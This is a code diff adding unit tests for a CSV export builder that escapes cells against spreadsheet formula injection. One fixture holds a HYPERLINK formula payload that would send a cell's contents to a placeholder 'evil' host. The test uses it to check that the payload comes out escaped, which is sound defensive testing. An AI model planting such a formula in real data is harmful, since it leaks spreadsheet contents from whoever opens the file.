@@ -6,7 +6,7 @@
 // mitigation so a future "cleanup" can't silently rip it out.
 
 import { describe, test, expect } from 'vitest';
-import { escapeCsvCell } from '../../app/controllers/_csv-escape.js';
+import { escapeCsvCell, buildCsv } from '../../app/controllers/_csv-escape.js';
 
 describe('escapeCsvCell — baseline quoting', () => {
     test('null and undefined collapse to empty quoted cell', () => {
@@ -73,5 +73,39 @@ describe('escapeCsvCell — formula-injection mitigation (OWASP)', () => {
     test('empty string is not double-prefixed', () => {
         // The `s.length > 0` guard avoids prefixing an empty value.
         expect(escapeCsvCell('')).toBe('""');
+    });
+});
+
+describe('buildCsv — export assembly routes every data cell through the escaper', () => {
+    const FIELDS = ['custId', 'custCompanyName', 'custEmail'];
+
+    test('a hostile user field is escaped in the assembled body (not raw)', () => {
+        // The whole point: a malicious tenant value must appear escaped in
+        // the CSV a co-tenant operator downloads, no matter the column.
+        const body = buildCsv(FIELDS, [
+            { custId: 1, custCompanyName: '=HYPERLINK("http://evil/?d="&A1,"x")', custEmail: 'a@b.com' },
+        ]);
+        // Formula-defused (leading ') AND quote-wrapped — never raw '=...'.
+        expect(body).toContain('"\'=HYPERLINK');
+        expect(body).not.toContain(',=HYPERLINK'); // a raw formula cell would look like this
+    });
+
+    test('header row is the raw (trusted constant) column names', () => {
+        const body = buildCsv(FIELDS, []);
+        expect(body.split('\r\n')[0]).toBe('custId,custCompanyName,custEmail');
+    });
+
+    test('rows are CRLF-joined with a trailing CRLF; an optional note is appended last', () => {
+        const body = buildCsv(FIELDS, [{ custId: 7, custCompanyName: 'Acme', custEmail: 'x@y.z' }], '# note');
+        const lines = body.split('\r\n');
+        expect(lines[0]).toBe('custId,custCompanyName,custEmail');            // header
+        expect(lines[1]).toBe('"7","Acme","x@y.z"');                          // escaped row
+        expect(lines[2]).toBe('# note');                                      // trailing note
+        expect(body.endsWith('\r\n')).toBe(true);                            // trailing CRLF
+    });
+
+    test('empty record set yields just the header + trailing CRLF', () => {
+        expect(buildCsv(FIELDS, [])).toBe('custId,custCompanyName,custEmail\r\n');
+        expect(buildCsv(FIELDS, null)).toBe('custId,custCompanyName,custEmail\r\n');
     });
 });
